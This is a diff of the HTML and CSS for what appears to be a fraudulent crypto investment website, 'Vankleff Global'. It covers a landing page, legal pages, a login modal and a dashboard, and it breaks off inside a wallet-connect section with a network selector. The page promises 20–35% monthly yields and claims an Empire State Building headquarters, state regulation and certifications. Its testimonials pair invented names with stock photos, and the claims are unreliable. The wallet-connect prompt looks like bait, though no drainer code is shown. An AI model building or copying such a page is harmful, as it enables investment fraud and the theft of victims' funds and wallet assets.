+.st-ico{width:38px;height:38px;border-radius:10px;background:#1a2200;display:flex;align-items:center;justify-content:center;font-size:18px;}
+.st-ttl{font-size:13px;font-weight:600;}
+.st-sub{font-size:10px;color:#aaa;margin-top:2px;}
+.st-amt{font-size:14px;font-weight:700;}
+.st-amt.p{color:#22c55e;}
+.st-amt.n{color:#ef4444;}
+.sbdg{font-size:10px;padding:2px 8px;border-radius:10px;margin-top:3px;display:inline-block;}
+.sp2{background:#3a2a00;color:#f59e0b;}
+.sc2{background:#1a2a1a;color:#22c55e;}
+.cr-card{background:#2d3a00;border-radius:16px;padding:20px;margin-bottom:16px;}
+.cr-big{font-size:38px;font-weight:900;color:#22c55e;text-align:center;margin:10px 0;}
+.cr-sum{background:#1a2200;border-radius:12px;padding:14px;margin:14px 0;}
+.cr-row{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #2a3000;font-size:13px;}
+.cr-row:last-child{border-bottom:none;font-weight:800;}
+.set-card{background:#3a4a00;border-radius:16px;padding:18px;margin-bottom:16px;}
+.set-inp{width:100%;background:#2a3800;border:1px solid #4a5a00;border-radius:10px;padding:12px 14px;color:#fff;font-size:13px;margin-top:6px;outline:none;}
+.set-lbl{font-size:11px;color:#aaa;margin-top:12px;display:block;}
+.btn-save{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:15px;font-weight:800;margin-top:14px;}
+.pref-sec{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:14px;}
+.pref-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #2a2a3e;}
+.pref-row:last-child{border-bottom:none;}
+.toggle{width:44px;height:24px;border-radius:12px;background:#333;position:relative;cursor:pointer;transition:background .2s;}
+.toggle.on{background:#22c55e;}
+.tknob{width:20px;height:20px;border-radius:50%;background:#fff;position:absolute;top:2px;left:2px;transition:left .2s;}
+.toggle.on .tknob{left:22px;}
 .ref-hero{background:#2d3a00;border-radius:16px;padding:24px;text-align:center;margin-bottom:16px;}
 .ref-tiers{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:16px;}
 .ref-tier{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #2a2a3e;}
@@ -316,843 +376,1084 @@ input[type=range]{width:100%;accent-color:#22c55e;margin-bottom:6px;}
 .ref-stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;}
 .ref-stat{background:#2d3a00;border-radius:12px;padding:14px;text-align:center;}
 .ref-sv{font-size:22px;font-weight:900;color:#c9a84c;}
-.set-card{background:#3a4a00;border-radius:16px;padding:18px;margin-bottom:16px;}
-.set-inp{width:100%;background:#2a3800;border:1px solid #4a5a00;border-radius:10px;padding:12px 14px;color:#fff;font-size:13px;margin-top:6px;outline:none;}
-.btn-save{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:15px;font-weight:800;margin-top:14px;}
-.tf-card{background:#1a1a0a;border:1px solid #c9a84c;border-radius:16px;padding:20px;}
-.tf-in{width:100%;background:#0d0d0d;border:1px solid #333;border-radius:10px;padding:13px;color:#fff;font-size:14px;margin-bottom:12px;outline:none;}
-.stmt-filters{display:flex;gap:8px;overflow-x:auto;padding:14px 20px;scrollbar-width:none;}
-.sfbtn{flex-shrink:0;padding:8px 16px;border-radius:20px;font-size:12px;font-weight:700;background:#2d3a00;color:#ccc;}
-.sfbtn.on{background:#22c55e;color:#fff;}
-.st-item{background:#2d3a00;border-radius:12px;padding:14px 16px;margin:0 20px 10px;display:flex;align-items:center;justify-content:space-between;}
-.st-lft{display:flex;align-items:center;gap:12px;}
-.st-ico{width:38px;height:38px;border-radius:10px;background:#1a2200;display:flex;align-items:center;justify-content:center;font-size:18px;}
-.st-ttl{font-size:13px;font-weight:600;}
-.st-sub{font-size:10px;color:#aaa;margin-top:2px;}
-.st-amt{font-size:14px;font-weight:700;}
-.st-amt.p{color:#22c55e;}.st-amt.n{color:#ef4444;}
-.sbdg{font-size:10px;padding:2px 8px;border-radius:10px;margin-top:3px;display:inline-block;}
-.sp2{background:#3a2a00;color:#f59e0b;}
-.sc2{background:#1a2a1a;color:#22c55e;}
-.gm-box{border-radius:16px;padding:28px 24px;background:#2d3a00;width:100%;max-width:360px;text-align:center;position:relative;}
-.gm-close{position:absolute;top:12px;right:14px;font-size:18px;color:#aaa;background:none;}
-.btn-gm{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;margin-bottom:8px;}
-.btn-gmc{width:100%;padding:12px;background:transparent;border:none;color:#aaa;font-size:13px;}
-.btn-cd{width:100%;padding:15px;border-radius:12px;font-size:15px;font-weight:800;background:#22c55e;color:#fff;}
-.btn-verify{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;margin-top:16px;}
-.conf-box{background:#1a1a2e;text-align:center;max-width:300px;width:90%;border-radius:16px;padding:28px 24px;}
-.conf-btns{display:flex;gap:10px;margin-top:16px;}
-.btn-yes{flex:1;padding:13px;background:#ef4444;border-radius:12px;color:#fff;font-size:14px;font-weight:700;}
-.btn-no{flex:1;padding:13px;background:#1a2a1a;border-radius:12px;color:#ccc;font-size:14px;font-weight:600;border:1px solid #333;}
-.suc-box{background:#161b2e;text-align:center;max-width:340px;width:90%;border-radius:16px;padding:28px 24px;position:relative;}
-.suc-close{position:absolute;top:12px;right:16px;font-size:20px;color:#aaa;background:none;}
-.wd-note-box{background:#161b2e;border:1px solid #c9a84c;max-width:380px;width:90%;text-align:center;border-radius:16px;padding:28px 24px;position:relative;}
+.story-card{background:#1c2640;border-radius:14px;padding:16px;margin:0 20px 12px;display:flex;gap:12px;}
+.st-av{width:46px;height:46px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid #c9a84c;}
 </style>
 </head>
 <body>
 
 <div id="risk-overlay">
-  <div class="risk-box"><div class="risk-icon">⚠️</div><h2>Important Risk Disclosure</h2><p>Trading digital assets involves <strong>significant risk of loss</strong> and is not suitable for all investors.</p><p style="color:#888;font-size:12px;">You may lose some or all of your capital.</p><button class="btn-risk" onclick="acceptRisk()">I Understand and Accept</button></div>
+  <div class="risk-box">
+    <div class="risk-icon">⚠️</div>
+    <h2>Important Risk Disclosure</h2>
+    <p>Trading digital assets involves <strong>significant risk of loss</strong> and is not suitable for all investors.</p>
+    <p style="color:#888;font-size:12px;">You may lose some or all of your capital.</p>
+    <button class="btn-risk" onclick="acceptRisk()">I Understand and Accept</button>
+  </div>
 </div>
 
-<!-- LANDING PAGE -->
+<div class="lang-fixed" id="lang-sel">
+  <button class="lang-trigger" onclick="toggleLang()">🌐 <span id="lc">EN</span> ▲</button>
+  <div class="lang-drop" id="lang-drop">
+    <div class="lang-opt" onclick="setLang('EN')">🇺🇸 English</div>
+    <div class="lang-opt" onclick="setLang('FR')">🇫🇷 Français</div>
+    <div class="lang-opt" onclick="setLang('ES')">🇪🇸 Español</div>
+    <div class="lang-opt" onclick="setLang('DE')">🇩🇪 Deutsch</div>
+    <div class="lang-opt" onclick="setLang('PT')">🇧🇷 Português</div>
+    <div class="lang-opt" onclick="setLang('AR')">🇸🇦 العربية</div>
+    <div class="lang-opt" onclick="setLang('ZH')">🇨🇳 中文</div>
+    <div class="lang-opt" onclick="setLang('JA')">🇯🇵 日本語</div>
+    <div class="lang-opt" onclick="setLang('KO')">🇰🇷 한국어</div>
+    <div class="lang-opt" onclick="setLang('RU')">🇷🇺 Русский</div>
+    <div class="lang-opt" onclick="setLang('TR')">🇹🇷 Türkçe</div>
+    <div class="lang-opt" onclick="setLang('HI')">🇮🇳 हिन्दी</div>
+    <div class="lang-opt" onclick="setLang('SW')">🇰🇪 Swahili</div>
+    <div class="lang-opt" onclick="setLang('ID')">🇮🇩 Bahasa</div>
+    <div class="lang-opt" onclick="setLang('VI')">🇻🇳 Tiếng Việt</div>
+    <div class="lang-opt" onclick="setLang('IT')">🇮🇹 Italiano</div>
+    <div class="lang-opt" onclick="setLang('PL')">🇵🇱 Polski</div>
+    <div class="lang-opt" onclick="setLang('NL')">🇳🇱 Nederlands</div>
+  </div>
+</div>
+
+<div id="landing-nav" class="navbar">
+  <div class="nav-logo">
+    <div class="logo-box">V</div>
+    <div><span class="brand-name">VANKLEFF GLOBAL</span><span class="brand-sub">New York · Est. 2015</span></div>
+  </div>
+  <div class="nav-btns">
+    <button class="btn-login" onclick="openAuth('signin')">Member Login</button>
+    <button class="btn-open" onclick="openAuth('create')">Open Account</button>
+  </div>
+</div>
+
 <div id="page-landing" class="page active">
-  <div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span><span class="brand-sub">New York · Est. 2015</span></div></div><div class="nav-btns"><button class="btn-login" onclick="openAuth('signin')">Member Login</button><button class="btn-open" onclick="openAuth('create')">Open Account</button></div></div>
   <div class="hero">
-    <div class="hero-bg"></div><div class="hero-overlay"></div>
-    <div class="hero-content"><div class="hero-badge">🏢 350 Fifth Avenue · Empire State Building · New York, NY</div><h1>Institutional Crypto Management <span class="g">from the Heart of</span> <span class="b">New York.</span></h1><p>Operating from the Empire State Building, Vankleff Global provides Wall Street-grade execution and secure digital asset growth for investors worldwide.</p></div>
+    <div class="hero-bg-fallback"></div>
+    <div class="hero-bg"></div>
+    <div class="hero-overlay"></div>
+    <div class="hero-content">
+      <div class="hero-badge">🏢 350 Fifth Avenue · Empire State Building · New York, NY</div>
+      <h1>Institutional Crypto Management <span class="g">from the Heart of</span> <span class="b">New York.</span></h1>
+      <p>Operating from the Empire State Building, Vankleff Global provides Wall Street-grade execution and secure digital asset growth for investors worldwide.</p>
+    </div>
   </div>
   <div class="about-curtain">
-    <div class="stats-grid"><div class="stat-card"><div class="stat-val">$4.2B+</div><div class="stat-lbl">Assets Under Management</div></div><div class="stat-card"><div class="stat-val">18,400+</div><div class="stat-lbl">Active Private Investors</div></div><div class="stat-card"><div class="stat-val">147%</div><div class="stat-lbl">Average Annual Return</div></div><div class="stat-card"><div class="stat-val">9+</div><div class="stat-lbl">Years of Operation</div></div></div>
-    <div class="section"><div class="sec-label">ABOUT VANKLEFF GLOBAL</div><h2>A New York Institution Since 2015</h2><p>Founded by former Goldman Sachs and JP Morgan executives, managing digital assets for high-net-worth clients across 47 countries.</p><ul class="check-list"><li>Regulated by New York State DFS</li><li>SOC 2 Type II Certified</li><li>Fully segregated client accounts</li><li>24/7 institutional-grade support</li></ul></div>
-    <div class="hq-card"><div class="hq-top"><div class="hq-icon">🏢</div><div><div style="font-size:15px;font-weight:800;">Empire State Building</div><div style="font-size:11px;color:#aaa;">New York Global HQ</div></div></div><table><tr><td>Address</td><td>350 Fifth Ave, 85th Floor, NY 10118</td></tr><tr><td>Founded</td><td>2015</td></tr><tr><td>Employees</td><td>240+</td></tr><tr><td>Support</td><td><a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a></td></tr></table></div>
-    <div class="section"><div class="sec-label">INVESTMENT PLANS</div><h2>Choose Your Growth Tier</h2>
-      <div class="plan-card"><div style="font-size:11px;color:#aaa;">Institutional Yield</div><div style="font-size:18px;font-weight:800;">From $1,000</div><div class="plan-yield">20%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
-      <div class="plan-card pop"><div class="plan-badge pb-green">Popular</div><div style="font-size:11px;color:#aaa;">Strategic Alpha</div><div style="font-size:18px;font-weight:800;">From $10,000</div><div class="plan-yield">25%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
-      <div class="plan-card best"><div class="plan-badge pb-blue">Best</div><div style="font-size:11px;color:#aaa;">Elite Managed</div><div style="font-size:18px;font-weight:800;">From $50,000+</div><div class="plan-yield">35%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
+    <div class="stats-grid">
+      <div class="stat-card"><div class="stat-val">$4.2B+</div><div class="stat-lbl">Assets Under Management</div></div>
+      <div class="stat-card"><div class="stat-val">18,400+</div><div class="stat-lbl">Active Private Investors</div></div>
+      <div class="stat-card"><div class="stat-val">147%</div><div class="stat-lbl">Average Annual Return</div></div>
+      <div class="stat-card"><div class="stat-val">9+</div><div class="stat-lbl">Years of Operation</div></div>
     </div>
-    <div class="section" style="background:#0a0f1a;"><div class="sec-label" style="text-align:center;">CLIENT FEEDBACK</div><h2 style="text-align:center;">Institutional Feedback</h2>
-      <div class="trust-card"><img class="trust-av" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&h=120&fit=crop&crop=face" alt="Mark"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Vankleff Global provides the security and execution speed required for high-net-worth management."</p><div class="trust-name">Mark R.</div><div class="trust-role">Managing Director</div><div class="trust-loc">New York</div></div></div>
-      <div class="trust-card"><img class="trust-av" src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=120&h=120&fit=crop&crop=face" alt="Sarah"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"The move to the Empire State Building reflects the firm's growth. Unmatched professionalism."</p><div class="trust-name">Sarah L.</div><div class="trust-role">Financial Strategist</div><div class="trust-loc">London</div></div></div>
-      <div class="trust-card"><img class="trust-av" src="https://images.unsplash.com/photo-1578950435899-d6b7b5c5dbda?w=120&h=120&fit=crop&crop=face" alt="William"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Copy trading turned my $15,000 into $46,000 in 3 weeks."</p><div class="trust-name">William Osei</div><div class="trust-role">Entrepreneur</div><div class="trust-loc">Ghana</div></div></div>
+
+    <div class="section" style="background:#0d0d0d;">
+      <div class="sec-label">ABOUT VANKLEFF GLOBAL</div>
+      <h2>A New York Institution Since 2015</h2>
+      <p>Founded by former Goldman Sachs and JP Morgan executives, managing digital assets for high-net-worth clients across 47 countries.</p>
+      <ul class="check-list">
+        <li>Regulated by New York State DFS</li>
+        <li>SOC 2 Type II Certified</li>
+        <li>Fully segregated client accounts</li>
+        <li>24/7 institutional-grade support</li>
+      </ul>
     </div>
-    <div class="cta-box"><div class="cta-logo">V</div><div style="font-size:10px;color:#c9a84c;font-weight:700;letter-spacing:2px;margin-bottom:8px;">PRIVATE MEMBERSHIP</div><h2 style="font-size:26px;font-weight:900;margin-bottom:10px;">Ready to Grow Your Digital Assets?</h2><p style="color:#aaa;font-size:12px;margin-bottom:22px;">Join 18,400+ private investors who trust Vankleff Global.</p><button class="btn-gold" onclick="openAuth('create')">Open Account →</button><button class="btn-secondary" onclick="openAuth('signin')">Member Login ›</button></div>
-    <footer><div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;"><div class="logo-box" style="width:34px;height:34px;font-size:14px;">V</div><span style="font-size:14px;font-weight:800;color:#c9a84c;letter-spacing:1px;">VANKLEFF GLOBAL</span></div><p style="color:#666;font-size:11px;line-height:1.7;margin-bottom:18px;">Institutional digital asset management from the Empire State Building, New York.</p><h4>Contact</h4><ul><li>350 Fifth Avenue, 85th Floor, New York, NY 10118</li><li><a href="mailto:support@vankleffglobal.com" class="femail">support@vankleffglobal.com</a></li></ul><h4>Legal</h4><ul><li><a href="#" onclick="showPage('terms')">Terms of Service</a></li><li><a href="#" onclick="showPage('privacy')">Privacy Policy</a></li><li><a href="#" onclick="openAuth('signin')">Member Login</a></li><li><a href="#" onclick="openAuth('create')" style="color:#22c55e;">Open Account</a></li></ul></footer>
+
+    <div class="hq-card">
+      <div class="hq-top">
+        <div class="hq-icon">🏢</div>
+        <div><div style="font-size:15px;font-weight:800;">Empire State Building</div><div style="font-size:11px;color:#aaa;">New York Global HQ</div></div>
+      </div>
+      <table>
+        <tr><td>Address</td><td>350 Fifth Ave, 85th Floor, NY 10118</td></tr>
+        <tr><td>Founded</td><td>2015</td></tr>
+        <tr><td>Employees</td><td>240+</td></tr>
+        <tr><td>Support</td><td><a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a></td></tr>
+      </table>
+    </div>
+
+    <div class="section">
+      <div class="sec-label">OUR SERVICES</div>
+      <h2>Why Institutional Investors Choose Us</h2>
+      <div class="svc-card"><div class="svc-icon">🛡️</div><h3>Institutional Security</h3><p>Multi-signature cold storage, SOC 2 certified, 24/7 monitoring.</p></div>
+      <div class="svc-card"><div class="svc-icon">📊</div><h3>Wall Street Execution</h3><p>Sub-millisecond latency across 40+ global exchanges.</p></div>
+      <div class="svc-card"><div class="svc-icon">📈</div><h3>Consistent Returns</h3><p>Proprietary algorithms delivering 8–18% targeted monthly yields.</p></div>
+      <div class="svc-card"><div class="svc-icon">🔒</div><h3>Segregated Accounts</h3><p>Fully segregated, independently audited portfolios.</p></div>
+    </div>
+
+    <div class="section">
+      <div class="sec-label">INVESTMENT PLANS</div>
+      <h2>Choose Your Growth Tier</h2>
+      <div class="plan-card">
+        <div style="font-size:11px;color:#aaa;">Institutional Yield</div>
+        <div style="font-size:18px;font-weight:800;">From $1,000</div>
+        <div class="plan-yield">20%</div>
+        <div class="plan-sub">targeted monthly yield</div>
+        <button class="btn-gs" onclick="openAuth('create')">Get Started</button>
+      </div>
+      <div class="plan-card pop">
+        <div class="plan-badge pb-green">Popular</div>
+        <div style="font-size:11px;color:#aaa;">Strategic Alpha</div>
+        <div style="font-size:18px;font-weight:800;">From $10,000</div>
+        <div class="plan-yield">25%</div>
+        <div class="plan-sub">targeted monthly yield</div>
+        <button class="btn-gs" onclick="openAuth('create')">Get Started</button>
+      </div>
+      <div class="plan-card best">
+        <div class="plan-badge pb-blue">Best</div>
+        <div style="font-size:11px;color:#aaa;">Elite Managed</div>
+        <div style="font-size:18px;font-weight:800;">From $50,000+</div>
+        <div class="plan-yield">35%</div>
+        <div class="plan-sub">targeted monthly yield</div>
+        <button class="btn-gs" onclick="openAuth('create')">Get Started</button>
+      </div>
+    </div>
+
+    <div class="section" style="background:#0a0f1a;">
+      <div class="sec-label" style="text-align:center;">CLIENT FEEDBACK</div>
+      <h2 style="text-align:center;">Institutional Feedback</h2>
+      <div class="trust-card">
+        <img class="trust-av" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&h=120&fit=crop&crop=face" alt="Mark"/>
+        <div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Vankleff Global provides the security and execution speed required for high-net-worth management."</p><div class="trust-name">Mark R.</div><div class="trust-role">Managing Director</div><div class="trust-loc">New York</div></div>
+      </div>
+      <div class="trust-card">
+        <img class="trust-av" src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=120&h=120&fit=crop&crop=face" alt="Sarah"/>
+        <div><div class="trust-stars">★★★★★</div><p class="trust-txt">"The move to the Empire State Building reflects the firm's growth. Unmatched professionalism."</p><div class="trust-name">Sarah L.</div><div class="trust-role">Financial Strategist</div><div class="trust-loc">London</div></div>
+      </div>
+      <div class="trust-card">
+        <img class="trust-av" src="https://images.unsplash.com/photo-1560250097-0b93528c311a?w=120&h=120&fit=crop&crop=face" alt="James"/>
+        <div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Consistently hitting my weekly targets. The most secure digital asset platform I've utilized."</p><div class="trust-name">James K.</div><div class="trust-role">Portfolio Lead</div><div class="trust-loc">Zurich</div></div>
+      </div>
+      <div class="trust-card">
+        <img class="trust-av" src="https://images.unsplash.com/photo-1578950435899-d6b7b5c5dbda?w=120&h=120&fit=crop&crop=face" alt="William Osei"/>
+        <div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Copy trading turned my $15,000 into $46,000 in 3 weeks."</p><div class="trust-name">William Osei</div><div class="trust-role">Entrepreneur</div><div class="trust-loc">Ghana</div></div>
+      </div>
+      <div class="trust-card">
+        <img class="trust-av" src="https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=120&h=120&fit=crop&crop=face" alt="Priya Sharma"/>
+        <div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Managing $20,000 portfolio from my phone daily. Mobile experience is flawless."</p><div class="trust-name">Priya Sharma</div><div class="trust-role">Portfolio Manager</div><div class="trust-loc">India</div></div>
+      </div>
+      <div class="trust-card">
+        <img class="trust-av" src="https://images.unsplash.com/photo-1609714468660-fd61e8756fe5?w=120&h=120&fit=crop&crop=face" alt="Zara Ahmed"/>
+        <div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Platform UI is modern and intuitive. Deposited via BTC in 10 minutes."</p><div class="trust-name">Zara Ahmed</div><div class="trust-role">Trader</div><div class="trust-loc">Pakistan</div></div>
+      </div>
+      <div class="trust-card">
+        <img class="trust-av" src="https://images.unsplash.com/photo-1607746882042-944635dfe10e?w=120&h=120&fit=crop&crop=face" alt="Sandra Obi"/>
+        <div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Joined 6 months ago. Total profits: $47,000. Total trust: 100%."</p><div class="trust-name">Sandra Obi</div><div class="trust-role">Investor</div><div class="trust-loc">Port Harcourt, Nigeria</div></div>
+      </div>
+    </div>
+
+    <div class="cta-box">
+      <div class="cta-logo">V</div>
+      <div style="font-size:10px;color:#c9a84c;font-weight:700;letter-spacing:2px;margin-bottom:8px;">PRIVATE MEMBERSHIP</div>
+      <h2 style="font-size:26px;font-weight:900;margin-bottom:10px;">Ready to Grow Your Digital Assets?</h2>
+      <p style="color:#aaa;font-size:12px;margin-bottom:22px;">Join 18,400+ private investors who trust Vankleff Global.</p>
+      <button class="btn-gold" onclick="openAuth('create')">Open Account →</button>
+      <button class="btn-secondary" onclick="openAuth('signin')">Member Login ›</button>
+    </div>
+
+    <footer>
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+        <div class="logo-box" style="width:34px;height:34px;font-size:14px;">V</div>
+        <span style="font-size:14px;font-weight:800;color:#c9a84c;letter-spacing:1px;">VANKLEFF GLOBAL</span>
+      </div>
+      <p style="color:#666;font-size:11px;line-height:1.7;margin-bottom:18px;">Institutional digital asset management from the Empire State Building, New York.</p>
+      <h4>Contact</h4>
+      <ul>
+        <li>350 Fifth Avenue, 85th Floor, New York, NY 10118</li>
+        <li><a href="mailto:support@vankleffglobal.com" class="femail">support@vankleffglobal.com</a></li>
+      </ul>
+      <h4>Legal</h4>
+      <ul>
+        <li><a href="#" onclick="showPage('terms')">Terms of Service</a></li>
+        <li><a href="#" onclick="showPage('privacy')">Privacy Policy</a></li>
+        <li><a href="#" onclick="openAuth('signin')">Member Login</a></li>
+        <li><a href="#" onclick="openAuth('create')" style="color:#22c55e;">Open Account</a></li>
+      </ul>
+    </footer>
   </div>
 </div>
 
-<div id="page-terms" class="page"><div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span></div></div><button class="btn-login" onclick="showPage('landing')">← Back</button></div><div class="legal-page"><h1>Terms of Service</h1><div class="legal-meta">Effective: January 1, 2025 · Vankleff Global LLC · New York, NY</div><h2>1. Acceptance</h2><p>By using the Vankleff Global platform, you agree to these Terms.</p><h2>2. Eligibility</h2><p>You must be at least 18 years of age.</p><h2>3. Risk Disclosure</h2><p>Trading digital assets involves substantial risk of loss.</p><h2>4. Governing Law</h2><p>These Terms are governed by the laws of the State of New York.</p><h2>5. Contact</h2><p>350 Fifth Avenue, 85th Floor, New York, NY 10118. <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a></p></div></div>
-<div id="page-privacy" class="page"><div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span></div></div><button class="btn-login" onclick="showPage('landing')">← Back</button></div><div class="legal-page"><h1>Privacy Policy</h1><div class="legal-meta">Effective: January 1, 2025 · Vankleff Global LLC · New York, NY</div><h2>1. Introduction</h2><p>Vankleff Global LLC is committed to protecting your privacy.</p><h2>2. Information We Collect</h2><p>Name, email, phone, country, and usage data.</p><h2>3. How We Use It</h2><p>To provide the platform, process transactions, and comply with legal obligations.</p><h2>4. Security</h2><p>AES-256 encryption, multi-factor authentication, and regular audits.</p><h2>5. Your Rights</h2><p>Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a>.</p></div></div>
-
-<!-- AUTH MODAL -->
-<div class="modal-ov" id="auth-modal" onclick="if(event.target===this)closeAuth()"><div class="modal-box"><button class="modal-close" onclick="closeAuth()">✕</button><div class="modal-logo">V</div><div class="modal-title">VANKLEFF GLOBAL</div><div class="modal-sub">Institutional Digital Asset Management</div><div class="tab-row"><button class="tab-btn" id="tab-c" onclick="switchTab('create')">Create Account</button><button class="tab-btn" id="tab-s" onclick="switchTab('signin')">Sign In</button></div><div id="form-create"><div class="fg"><span class="fi">👤</span><input type="text" id="c-name" placeholder="Full Name"/></div><div class="fg"><span class="fi">✉️</span><input type="email" id="c-email" placeholder="Email Address"/></div><div class="fg"><span class="fi">🔒</span><input type="password" id="c-pass" placeholder="Password"/></div><div class="loading-spinner" id="load-create"><div class="spinner-ring"></div><p style="color:#aaa;font-size:12px;">Creating your account...</p></div><button class="btn-submit" id="btn-create" onclick="doLoginCreate()">Create Private Account →</button></div><div id="form-signin" style="display:none;"><div class="fg"><span class="fi">✉️</span><input type="email" id="s-email" placeholder="Email Address"/></div><div class="fg"><span class="fi">🔒</span><input type="password" id="s-pass" placeholder="Password"/></div><div class="loading-spinner" id="load-signin"><div class="spinner-ring"></div><p style="color:#aaa;font-size:12px;">Signing you in...</p></div><button class="btn-submit" id="btn-signin" onclick="doLoginSignIn()">Sign In to Dashboard →</button></div></div></div>
-
-<!-- DASHBOARD -->
-<div id="page-dashboard" class="page">
-  <div class="sb-ov" id="sb-ov" onclick="closeSB()"></div>
-  <div class="sidebar" id="sidebar"><div class="sb-top"><div style="display:flex;align-items:center;gap:8px;"><div class="dn-logo">V</div><span style="font-size:13px;font-weight:800;color:#c9a84c;">VANKLEFF GLOBAL</span></div><button class="sb-close" onclick="closeSB()">✕</button></div><div class="sb-grp">OVERVIEW</div><div class="sb-item on" onclick="showDash('main');closeSB()"><div class="sb-left"><div class="sb-icon">⊞</div>Dashboard</div></div><div class="sb-item" onclick="showDash('deposit');closeSB()"><div class="sb-left"><div class="sb-icon">⬇</div>Deposit</div></div><div class="sb-item" onclick="showDash('withdraw');closeSB()"><div class="sb-left"><div class="sb-icon">⬆</div>Withdraw</div></div><div class="sb-item" onclick="showDash('statement');closeSB()"><div class="sb-left"><div class="sb-icon">📋</div>Statement</div></div><div class="sb-item" onclick="showDash('settings');closeSB()"><div class="sb-left"><div class="sb-icon">⚙</div>Settings</div></div><div class="sb-item" onclick="showConf();closeSB()"><div class="sb-left" style="color:#ef4444;"><div class="sb-icon">🚪</div>Logout</div></div></div>
-  <div class="dash-nav"><button class="ham" onclick="openSB()">☰</button><div class="dn-brand"><div class="dn-logo">V</div><div><span class="dn-name">VANKLEFF GLOBAL</span><span class="dn-sub">Your Gateway to Trading</span></div></div><div class="av-circle" onclick="openPM()">V</div></div>
-
-  <!-- MAIN DASHBOARD -->
-  <div id="dd-main"><div class="dash-content">
-    <div style="margin-bottom:16px;"><h2 style="font-size:20px;font-weight:800;">Welcome back, <span style="color:#22c55e;">vincentchidiadi</span></h2><p style="font-size:12px;color:#aaa;">Your trading overview</p></div>
-    <div class="balance-card"><div class="bal-lbl">Available Balance</div><div class="bal-amount">$100.00</div><div class="bal-btns"><button class="btn-dep" onclick="showDash('deposit')">⬇ Deposit</button><button class="btn-wit" onclick="showDash('withdraw')">⬆ Withdraw</button></div></div>
-    <div class="mini-grid"><div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">📈</div><div class="mc-val">+$0.00</div><div class="mc-lbl">Total Profit</div></div><div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">⬇</div><div class="mc-val">$0.00</div><div class="mc-lbl">Total Deposit</div></div></div>
-    <div class="price-box"><h3>Live Prices <span class="ldot"></span></h3><div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">Bitcoin</div><div class="pr-tk">BTC</div></div></div><div style="text-align:right"><div class="pr-price" id="p-btc">$97,245.3</div><div class="up" id="c-btc">▲ +2.4%</div></div></div><div class="pr"><div class="pr-l"><div class="pr-ic">E</div><div><div class="pr-nm">Ethereum</div><div class="pr-tk">ETH</div></div></div><div style="text-align:right"><div class="pr-price" id="p-eth">$3,412.8</div><div class="up" id="c-eth">▲ +1.8%</div></div></div><div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">BNB</div><div class="pr-tk">BNB</div></div></div><div style="text-align:right"><div class="pr-price" id="p-bnb">$645.2</div><div class="dn2" id="c-bnb">▼ -0.3%</div></div></div></div>
-
-    <!-- ═══════ WEB3 WALLET CONNECT ═══════ -->
-    <div class="wcta" id="web3-section">
-      <h3 style="font-size:18px;font-weight:900;margin-bottom:8px;">Connect Your Wallet. Claim Your Trading Edge.</h3>
-      <p style="font-size:12px;color:#aaa;margin-bottom:14px;">Select a network, then connect your wallet for high-speed execution and strategic market access.</p>
-
-      <!-- ── NETWORK SELECTOR ── -->
-      <div class="net-selector" id="networkSelector">
-        <div class="net-opt active-bsc" id="net-bsc" onclick="selectNetwork('bsc')">
-          <span class="net-icon">🟡</span>
-          <div style="text-align:left;">
-            <div style="font-size:13px;font-weight:800;">BSC</div>
-            <div style="font-size:10px;opacity:.7;">BNB Chain · ID 56</div>
-          </div>
-        </div>
-        <div class="net-opt" id="net-eth" onclick="selectNetwork('eth')">
-          <span class="net-icon">🔷</span>
-          <div style="text-align:left;">
-            <div style="font-size:13px;font-weight:800;">Ethereum</div>
-            <div style="font-size:10px;opacity:.7;">Mainnet · ID 1</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- ── ACTIVE NETWORK INDICATOR ── -->
-      <div class="active-net-bar" id="activeNetBar">
